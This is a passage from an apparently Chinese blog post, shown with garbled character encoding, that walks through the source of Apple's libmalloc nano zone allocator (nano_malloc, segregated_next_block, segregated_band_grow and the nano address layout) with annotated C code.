</span>&#123;</span><br><span class="line">	<span class="keyword">void</span>	*ptr;</span><br><span class="line">	<span class="comment">/*...*/</span></span><br><span class="line">	ptr = zone-&gt;<span class="built_in">malloc</span>(zone, size);</span><br><span class="line">	<span class="comment">/*...*/</span></span><br><span class="line">	<span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line"><span class="title">nano_malloc</span><span class="params">(nanozone_t *nanozone, size_t size)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;= NANO_MAX_SIZE) &#123;</span><br><span class="line">		<span class="keyword">void</span> *p = _nano_malloc_check_clear(nanozone, size, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (p) &#123;</span><br><span class="line">			<span class="keyword">return</span> p;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">/* FALLTHROUGH to helper zone */</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">malloc_zone_t</span> *zone = (<span class="keyword">malloc_zone_t</span> *)(nanozone-&gt;helper_zone);</span><br><span class="line">	<span class="keyword">return</span> zone-&gt;<span class="built_in">malloc</span>(zone, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å› ä¸ºé»˜è®¤çš„<code>zone</code>æ˜¯ä½¿ç”¨<code>nano_zone_t</code>ï¼Œåœ¨<code>malloc_zone_malloc</code>ä¸­çš„<code>zone-&gt;malloc()</code>å‡½æ•°è¢«è°ƒç”¨ä¹‹åï¼Œåœ¨</p>
<p><code>nano_malloc</code>ä¼šä¾æ®ç”³è¯·çš„sizeè¿›è¡Œåˆ¤æ–­ï¼Œå½“åªæœ‰å½“<code>size</code>å°äº<code>NANO_MAX_SIZE</code>çš„æ—¶å€™æ‰ä¼šè°ƒç”¨<code>nano_malloc</code>çš„å†…éƒ¨å®ç°<code>_nano_malloc_check_clear</code>ï¼Œå¦åˆ™å°±é€šè¿‡<code>nanozone-&gt;helper_zone</code>çš„<code>malloc</code>å‡½æ•°ï¼Œè¿›ä¸€æ­¥åˆ¤æ–­ä½¿ç”¨<code>tiny</code>ã€<code>small</code>ã€è¿˜æ˜¯<code>large</code>ã€‚</p>
<h3 id="ç¬¬ä¸€æ¬¡è°ƒç”¨_nano_malloc_check_clear">ç¬¬ä¸€æ¬¡è°ƒç”¨_nano_malloc_check_clear</h3><p>æ‰€ä»¥éœ€è¦é‡ç‚¹åˆ†æçš„å‡½æ•°æ˜¯<code>_nano_malloc_check_clear</code>ã€‚è€Œç¬¬ä¸€æ¬¡è°ƒç”¨<code>malloc</code>çš„è¯ï¼Œä¸»è¦æµç¨‹åœ¨<code>segregated_next_block</code>ä¸­å®ç°ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> </span><br><span class="line">_nano_malloc_check_clear(<span class="keyword">nanozone_t</span> *nanozone, <span class="keyword">size_t</span> size, <span class="keyword">boolean_t</span> cleared_requested)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">void</span>		*ptr;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>	slot_key;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>	slot_bytes = segregated_size_to_fit(nanozone, size, &amp;slot_key); <span class="comment">// Note slot_key is set here</span></span><br><span class="line">	<span class="comment">//SLOT_BYTESæ˜¯å›ºå®šçš„16ã€32ã€64ã€128ã€ã€ã€ã€</span></span><br><span class="line">	<span class="comment">//slot_key 1~16</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>	mag_index = NANO_MAG_INDEX(nanozone);</span><br><span class="line">	<span class="comment">//è·å–cpuå¯¹åº”çš„index</span></span><br><span class="line">  </span><br><span class="line">	<span class="comment">//é€‰æ‹©cpuä»¥åŠå¯¹åº”çš„å†…å­˜å¤§å°å—</span></span><br><span class="line">	<span class="keyword">nano_meta_admin_t</span>	pMeta = &amp;(nanozone-&gt;meta_data[mag_index][slot_key]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//æ£€æµ‹æ˜¯å¦å­˜åœ¨å·²ç»é‡Šæ”¾è¿‡ï¼Œå¯ä»¥ç›´æ¥æ‹¿æ¥ç”¨çš„å†…å­˜</span></span><br><span class="line">	ptr = OSAtomicDequeue( &amp;(pMeta-&gt;slot_LIFO), offsetof(<span class="keyword">struct</span> chained_block_s,next));</span><br><span class="line">	<span class="keyword">if</span> (ptr) &#123;</span><br><span class="line">		<span class="comment">/*...*/</span></span><br><span class="line">      	<span class="comment">//å¦‚æœé˜Ÿåˆ—ä¸­å­˜åœ¨å‡½æ•°ï¼Œåˆ™ç›´æ¥ä½¿ç”¨é˜Ÿåˆ—ä¸­çš„æ•°æ®</span></span><br><span class="line">      	<span class="comment">//ç¬¬ä¸€æ¬¡è°ƒç”¨mallocæ—¶ï¼Œä¸ä¼šæ‰§è¡Œè¿™ä¸€å—ä»£ç ï¼Œæ‰€ä»¥åé¢å†å¦åšåˆ†æ</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">//æ²¡æœ‰é‡Šæ”¾è¿‡çš„å†…å­˜ï¼Œæ‰€ä»¥è°ƒç”¨å‡½æ•° è·å–å†…å­˜</span></span><br><span class="line">		ptr = segregated_next_block(nanozone, pMeta, slot_bytes, mag_index);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (cleared_requested &amp;&amp; ptr)</span><br><span class="line">		<span class="built_in">memset</span>(ptr, <span class="number">0</span>, slot_bytes); <span class="comment">// <span class="doctag">TODO:</span> Needs a memory barrier after memset to ensure zeroes land first?</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="segregated_size_to_fit">segregated_size_to_fit</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line">input : size = 0 </span><br><span class="line">size = NANO_REGIME_QUANTA_SIZE==&gt;(1&lt;&lt;4)==&gt;2^4==&gt;16</span><br><span class="line">k = (16 + 16 - 1) &gt;&gt; 4 ==&gt; 31&gt;&gt;4 ==&gt; 1</span><br><span class="line">slot_bytes = 1 &lt;&lt; 4 ==&gt; 16</span><br><span class="line">*pkey = 0 </span><br><span class="line"></span><br><span class="line">input : size = 16 </span><br><span class="line">size = 16</span><br><span class="line">k = (16+16-1) &gt;&gt; 4 ==&gt;1</span><br><span class="line">slot_bytes = 16</span><br><span class="line">*pkey = 0</span><br><span class="line"></span><br><span class="line">input : size = 32</span><br><span class="line">size : 32</span><br><span class="line">k = (32+16-1)&gt;&gt;4 ==&gt;2</span><br><span class="line">slot_bytes = 2&lt;&lt;4 = 32</span><br><span class="line">*pkey = 2-1 ==&gt;1</span><br><span class="line"></span><br><span class="line">0~16 :</span><br><span class="line">pkey ==&gt; 0</span><br><span class="line">slot_bytes ==&gt; 16B</span><br><span class="line"></span><br><span class="line">17~32</span><br><span class="line">pkey ==&gt; 1</span><br><span class="line">slot_bytes ==&gt; 32B</span><br><span class="line"></span><br><span class="line">256</span><br><span class="line">pkey ==&gt; 16</span><br><span class="line">slot_bytes ==&gt; 256B</span><br><span class="line">*/</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> INLINE <span class="keyword">unsigned</span> <span class="keyword">int</span></span><br><span class="line"><span class="title">segregated_size_to_fit</span><span class="params">(nanozone_t *nanozone, size_t size, <span class="keyword">unsigned</span> <span class="keyword">int</span> *pKey)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> k, slot_bytes;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == size)</span><br><span class="line">		size = NANO_REGIME_QUANTA_SIZE; <span class="comment">// Historical behavior</span></span><br><span class="line"></span><br><span class="line">	k = (size + NANO_REGIME_QUANTA_SIZE - <span class="number">1</span>) &gt;&gt; SHIFT_NANO_QUANTUM; <span class="comment">// round up and shift for number of quanta</span></span><br><span class="line">	slot_bytes = k &lt;&lt; SHIFT_NANO_QUANTUM; <span class="comment">// multiply by power of two quanta size</span></span><br><span class="line">	*pKey = k - <span class="number">1</span>; <span class="comment">// Zero-based!</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> slot_bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¯¥å‡½æ•°å®ç°çš„åŠŸèƒ½æ˜¯æ ¹æ®ç”³è¯·çš„<code>size</code>å¤§å°ï¼Œè®¡ç®—åˆ°ç›¸åº”çš„éœ€è¦ç”³è¯·çš„ç›¸åº”çš„slot_bytesã€‚ä¾‹å¦‚ç”³è¯·çš„å¤§å°æ˜¯20çš„è¯ï¼Œ<code>slot_bytes</code>å°±åº”å½“æ˜¯32ã€‚</p>
<h4 id="åˆè§segregated_next_block">åˆè§segregated_next_block</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> INLINE <span class="keyword">void</span> *</span><br><span class="line"><span class="title">segregated_next_block</span><span class="params">(nanozone_t *nanozone, nano_meta_admin_t pMeta, <span class="keyword">unsigned</span> <span class="keyword">int</span> slot_bytes, <span class="keyword">unsigned</span> <span class="keyword">int</span> mag_index)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">uintptr_t</span> theLimit = pMeta-&gt;slot_limit_addr; <span class="comment">// Capture the slot limit that bounds slot_bump_addr right now</span></span><br><span class="line">		<span class="comment">//pMeta-&gt;slot_limit_addr</span></span><br><span class="line">		<span class="comment">//å½“å‰è¿™å—pMetaå¯ç”¨å†…å­˜çš„ç»“æŸåœ°å€ã€‚</span></span><br><span class="line">		<span class="keyword">uintptr_t</span> b = OSAtomicAdd64Barrier(slot_bytes, (<span class="keyword">volatile</span> <span class="keyword">int64_t</span> *)&amp;(pMeta-&gt;slot_bump_addr));</span><br><span class="line">		<span class="comment">//åŸå­çš„ä¸ºpMeta-&gt;slot_bump_addræ·»åŠ slot_bytesçš„é•¿åº¦ï¼Œåç§»åˆ°ä¸‹ä¸€ä¸ªåœ°å€</span></span><br><span class="line">		b -= slot_bytes; <span class="comment">// Atomic op returned addr of *next* free block. Subtract to get addr for *this* allocation.</span></span><br><span class="line">		<span class="comment">//å‡å»æ·»åŠ çš„åç§»é‡ï¼Œè·å–å½“å‰å¯ä»¥è·å–çš„åœ°å€</span></span><br><span class="line">		<span class="keyword">if</span> (b &lt; theLimit) &#123; <span class="comment">// Did we stay within the bound of the present slot allocation?</span></span><br><span class="line">			<span class="comment">//å¦‚æœåœ°å€è¿˜åœ¨èŒƒå›´ä¹‹å†…ï¼Œåˆ™è¿”å›åœ°å€</span></span><br><span class="line">			<span class="comment">//<span class="doctag">todo:</span>bä¸ä»…å°äºthelimitä¸”è¿œè¿œå°äºthelimitï¼Œå°±å¯ä»¥è·å–ä¸€ä¸ªå°±æŒ‡å‘å…¶ä»–å†…å­˜å—çš„åœ°å€äº†ã€‚</span></span><br><span class="line">			<span class="keyword">return</span> (<span class="keyword">void</span> *)b; <span class="comment">// Yep, so the slot_bump_addr this thread incremented is good to go</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (pMeta-&gt;slot_exhausted) &#123; <span class="comment">// exhausted all the bands availble for this slot?</span></span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// We're toast</span></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="comment">// One thread will grow the heap, others will see its been grown and retry allocation</span></span><br><span class="line">				_malloc_lock_lock(&amp;nanozone-&gt;band_resupply_lock[mag_index]);</span><br><span class="line">				<span class="comment">// re-check state now that we've taken the lock</span></span><br><span class="line">				<span class="keyword">if</span> (pMeta-&gt;slot_exhausted) &#123;</span><br><span class="line">					_malloc_lock_unlock(&amp;nanozone-&gt;band_resupply_lock[mag_index]);</span><br><span class="line">					<span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// Toast</span></span><br><span class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (b &lt; pMeta-&gt;slot_limit_addr) &#123;</span><br><span class="line">					_malloc_lock_unlock(&amp;nanozone-&gt;band_resupply_lock[mag_index]);</span><br><span class="line">					<span class="keyword">continue</span>; <span class="comment">// ... the slot was successfully grown by first-taker (not us). Now try again.</span></span><br><span class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (segregated_band_grow(nanozone, pMeta, slot_bytes, mag_index)) &#123;</span><br><span class="line">					_malloc_lock_unlock(&amp;nanozone-&gt;band_resupply_lock[mag_index]);</span><br><span class="line">					<span class="keyword">continue</span>; <span class="comment">// ... the slot has been successfully grown by us. Now try again.</span></span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					pMeta-&gt;slot_exhausted = TRUE;</span><br><span class="line">					_malloc_lock_unlock(&amp;nanozone-&gt;band_resupply_lock[mag_index]);</span><br><span class="line">					<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å› ä¸ºæ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨<code>segregated_next_block</code>å‡½æ•°ï¼Œ<code>theLimit</code>çš„å€¼ä¸º0ï¼Œ<code>b</code>çš„å€¼ä¹Ÿä¸º0ã€‚</p>
<p>åˆå› ä¸º<code>pMeta-&gt;slot_exhausted</code>çš„å€¼ä¹Ÿæ˜¯0ï¼Œä¸”<code>pMeta-&gt;slot_limit_addr</code>çš„å€¼ä¹Ÿä¸º0ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨</p>
<p><code>segregated_band_grow(nanozone, pMeta, slot_bytes, mag_index)</code>ã€‚</p>
<p>è¯¥å‡½æ•°çš„å®ç°éå¸¸çš„æœ‰<strong>æŠ€å·§</strong>æ€§ï¼Œæ‰€ä»¥ä¸åªæœ‰<strong>åˆå§‹åŒ–</strong><code>nano_zone</code>ä¸­<code>band</code>çš„åŠŸèƒ½ï¼Œåœ¨åé¢çš„åˆ†æè¿˜ä¼šé‡åˆ°ï¼Œé‡åˆ°ä¹‹åå†åšè¯¦ç»†åˆ†æã€‚</p>
<h4 id="è·å¾—ç¬¬ä¸€ä¸ªBAND">è·å¾—ç¬¬ä¸€ä¸ªBAND</h4><p><code>segregated_band_grow</code>å‡½æ•°å®ç°äº†2ä¸ªåŠŸèƒ½ã€‚</p>
<ul>
<li><code>BAND</code>ç”¨å°½åçš„å¢é•¿</li>
<li>ä»¥åŠä¸€ä¸ªç‰¹æ®Šæƒ…å†µï¼Œåˆ›å»ºç¬¬ä¸€ä¸ª<code>BAND</code></li>
</ul>
<h5 id="ä»€ä¹ˆæ˜¯BAND">ä»€ä¹ˆæ˜¯BAND</h5><p>æ¯ä¸€ä¸ª<code>BAND</code>çš„å¤§å°ä¸º2MBï¼Œæ˜¯<code>nano_zone_t</code>å‘å †ç”³è¯·å†…å­˜çš„å•ä½ï¼Œæ¯ä¸€ä¸ªç‹¬ç«‹çš„cpuæ¯æ¬¡ç”³è¯·ä¸€ä¸ª<code>BAND</code>ï¼Œå½“ä¸€ä¸ª<code>BAND</code>ç”¨å®Œä¹‹åï¼Œä¼šå†ç”³è¯·ä¸€ä¸ª<code>BAND</code>ã€‚æ¯ä¸€ä¸ªcpuçš„<code>BAND</code>æ˜¯åˆ†å¼€ä½¿ç”¨çš„ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> boolean_t</span><br><span class="line"><span class="title">segregated_band_grow</span><span class="params">(nanozone_t *nanozone, nano_meta_admin_t pMeta, <span class="keyword">unsigned</span> <span class="keyword">int</span> slot_bytes, <span class="keyword">unsigned</span> <span class="keyword">int</span> mag_index)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">nano_blk_addr_t</span> u; <span class="comment">// the compiler holds this in a register</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> p, s;</span><br><span class="line">	<span class="keyword">size_t</span> watermark, hiwater;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == pMeta-&gt;slot_current_base_addr) &#123; <span class="comment">// First encounter?</span></span><br><span class="line"></span><br><span class="line">		u.fields.nano_signature = NANOZONE_SIGNATURE;</span><br><span class="line">		u.fields.nano_mag_index = mag_index;</span><br><span class="line">		u.fields.nano_band = <span class="number">0</span>;</span><br><span class="line">		u.fields.nano_slot = (slot_bytes &gt;&gt; SHIFT_NANO_QUANTUM) - <span class="number">1</span>;</span><br><span class="line">		u.fields.nano_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		p = u.addr;</span><br><span class="line">		<span class="comment">//ä½¿ç”¨unionè®¡ç®—åœ°å€æ˜¯å¤šå°‘</span></span><br><span class="line">		pMeta-&gt;slot_bytes = slot_bytes;</span><br><span class="line">		pMeta-&gt;slot_objects = SLOT_IN_BAND_SIZE / slot_bytes;  <span class="comment">//128KB/slot_bytes==&gt;æœ‰å¤šå°‘ä¸ªåˆ†ç‰‡ã€‚</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		p = pMeta-&gt;slot_current_base_addr + BAND_SIZE; <span class="comment">// Growing, so stride ahead by BAND_SIZE 1&lt;&lt;21 ==&gt; 2^21</span></span><br><span class="line">		<span class="comment">//å†slot_current_base_addrå†å¢åŠ 2</span></span><br><span class="line">		u.addr = (<span class="keyword">uint64_t</span>)p;</span><br><span class="line">		<span class="keyword">if</span> (<span class="number">0</span> == u.fields.nano_band) <span class="comment">// Did the band index wrap?</span></span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">		assert(slot_bytes == pMeta-&gt;slot_bytes);</span><br><span class="line">	&#125;</span><br><span class="line">	pMeta-&gt;slot_current_base_addr = p;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//band_sizeå¤§å°æ˜¯2MB</span></span><br><span class="line">	<span class="comment">//æ ¹æ®å½“å‰slot_current_base_addrï¼Œè®¡ç®—å¾—åˆ°bandçš„å¼€å§‹åœ°å€ï¼Œç”¨äºå†…å­˜ç”³è¯·ã€‚</span></span><br><span class="line">	<span class="keyword">mach_vm_address_t</span> vm_addr = p &amp; ~((<span class="keyword">uintptr_t</span>)(BAND_SIZE - <span class="number">1</span>)); <span class="comment">// Address of the (2MB) band covering this (128KB) slot</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (nanozone-&gt;band_max_mapped_baseaddr[mag_index] &lt; vm_addr) &#123;</span><br><span class="line">		<span class="comment">// Obtain the next band to cover this slot</span></span><br><span class="line">		<span class="comment">// ç”³è¯·2MBçš„ç©ºé—´ç”¨äºè¿™ä¸ªband</span></span><br><span class="line">		<span class="keyword">kern_return_t</span> kr = mach_vm_map(mach_task_self(), &amp;vm_addr, BAND_SIZE,</span><br><span class="line">		                               <span class="number">0</span>, VM_MAKE_TAG(VM_MEMORY_MALLOC_NANO), MEMORY_OBJECT_NULL, <span class="number">0</span>, FALSE,</span><br><span class="line">		                               VM_PROT_DEFAULT, VM_PROT_ALL, VM_INHERIT_DEFAULT);</span><br><span class="line">      	<span class="comment">/* ...*/</span></span><br><span class="line">		nanozone-&gt;band_max_mapped_baseaddr[mag_index] = vm_addr;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Randomize the starting allocation from this slot (introduces 11 to 14 bits of entropy)</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == pMeta-&gt;slot_objects_mapped) &#123; <span class="comment">// First encounter?</span></span><br><span class="line">		<span class="comment">//SLOT_IN_BAND_SIZE / slot_bytes è¿™ä¸ªslotä¼šè¢«åˆ†æˆå¤šå°‘ä»½ã€‚</span></span><br><span class="line">		pMeta-&gt;slot_objects_skipped = (malloc_entropy[<span class="number">1</span>] % (SLOT_IN_BAND_SIZE / slot_bytes));</span><br><span class="line">		<span class="comment">//é€šè¿‡å–ä½™åœ¨å†…å­˜å¼€å§‹å¤„ç©ºå‡ºå‡ ä¸ªslot_bytesä¸ç”¨ã€‚</span></span><br><span class="line">		pMeta-&gt;slot_bump_addr = p + (pMeta-&gt;slot_objects_skipped * slot_bytes);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		pMeta-&gt;slot_bump_addr = p;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pMeta-&gt;slot_limit_addr = p + (SLOT_IN_BAND_SIZE / slot_bytes) * slot_bytes; <span class="comment">//p+128KB</span></span><br><span class="line">	pMeta-&gt;slot_objects_mapped += (SLOT_IN_BAND_SIZE / slot_bytes); <span class="comment">//128KB/slot_bytes</span></span><br><span class="line"></span><br><span class="line">	u.fields.nano_signature = NANOZONE_SIGNATURE;</span><br><span class="line">	u.fields.nano_mag_index = mag_index;</span><br><span class="line">	u.fields.nano_band = <span class="number">0</span>;</span><br><span class="line">	u.fields.nano_slot = <span class="number">0</span>;</span><br><span class="line">	u.fields.nano_offset = <span class="number">0</span>;</span><br><span class="line">	s = u.addr; <span class="comment">// Base for this core.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Set the high water mark for this CPU's entire magazine, if this resupply raised it.</span></span><br><span class="line">    watermark = nanozone-&gt;core_mapped_size[mag_index];</span><br><span class="line">    hiwater = MAX( watermark, p - s + SLOT_IN_BAND_SIZE );</span><br><span class="line">    nanozone-&gt;core_mapped_size[mag_index] = hiwater;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="è·å–pMeta-&gt;slot_current_base_addr">è·å–pMeta-&gt;slot_current_base_addr</h5><p>ç¬¬ä¸€æ¬¡è°ƒç”¨<code>segregated_band_grow</code>ï¼Œå› ä¸º<code>0 == pMeta-&gt;slot_current_base_addr</code>ï¼Œæ‰€ä»¥è¿›è¡Œåˆå§‹åŒ–ï¼Œåˆ©ç”¨</p>
<p><code>nano_blk_addr_t</code>è¿™ä¸ªç»“æ„ï¼Œè®¡ç®—å½“å‰çš„<code>slot_current_base_addr</code>çš„åœ°å€æ˜¯å¤šå°‘ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> nano_blk_addr_s &#123;</span><br><span class="line">	<span class="keyword">uint64_t</span></span><br><span class="line">nano_offset:NANO_OFFSET_BITS,		<span class="comment">// locates the block</span></span><br><span class="line">nano_slot:NANO_SLOT_BITS,		<span class="comment">// bucket of homogenous quanta-multiple blocks</span></span><br><span class="line">nano_band:NANO_BAND_BITS,</span><br><span class="line">nano_mag_index:NANO_MAG_BITS,		<span class="comment">// the core that allocated this block</span></span><br><span class="line">nano_signature:NANO_SIGNATURE_BITS;	<span class="comment">// 0x00006nnnnnnnnnnn the address range devoted to us.</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">union</span>  &#123;</span><br><span class="line">	<span class="keyword">uint64_t</span>			addr;</span><br><span class="line">	<span class="keyword">struct</span> nano_blk_addr_s	fields;</span><br><span class="line">&#125; <span class="keyword">nano_blk_addr_t</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*...*/</span></span><br><span class="line">		u.fields.nano_signature = NANOZONE_SIGNATURE;</span><br><span class="line">		u.fields.nano_mag_index = mag_index;</span><br><span class="line">		u.fields.nano_band = <span class="number">0</span>;</span><br><span class="line">		u.fields.nano_slot = (slot_bytes &gt;&gt; SHIFT_NANO_QUANTUM) - <span class="number">1</span>;</span><br><span class="line">		u.fields.nano_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		p = u.addr;</span><br><span class="line">		<span class="comment">/*...*/</span></span><br></pre></td></tr></table></figure>
